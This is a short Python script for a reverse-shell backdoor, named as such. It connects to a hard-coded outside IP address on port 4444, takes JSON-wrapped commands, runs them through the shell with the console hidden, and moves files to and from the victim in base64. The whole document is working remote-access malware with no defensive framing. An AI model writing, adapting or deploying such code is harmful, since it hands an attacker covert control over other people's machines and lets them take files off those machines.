#!/usr/bin/env python
#Need subprocess resolution
import socket, subprocess, json, os, base64

class Backdoor:
    
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_command(self,command):
        #DEVNULL is used to execute the file without a console poping up
        DEVNULL=open(os.devnull,"wb")
        return subprocess.check_output(command, shell=True,stderr=DEVNULL,stdin=DEVNULL)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path +"\n"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful.\n"

    def handle_command(self, command):
        result = ""
        try:
            if command[0] == "exit":
                self.connection.close()
                os.exit()

            elif command[0] == "cd":
                if len(command) > 1:
                    result = self.change_working_directory(command[1])

                else:
                    result = self.execute_command(command)

            elif len(command) > 1:
                aux_command = ""
                if command[0] == "download":
                    result = self.read_file(command[1])

                elif command[0] == "upload":
                    result = self.write_file(command[1],command[2])
                
                else:
                    for word in command:
                        aux_command = aux_command + " " + word
                    result = self.execute_command(aux_command)
            else:
                result = self.execute_command(command)
        except Exception:
            result = "[-] Error during command execution...\n"
        
        return result

    def run(self):
        while True:
            command = self.reliable_receive()
            result = self.handle_command(command)
            self.reliable_send(result)
        self.connection.close()


my_backdoor = Backdoor("85.138.158.42",4444)
my_backdoor.run() 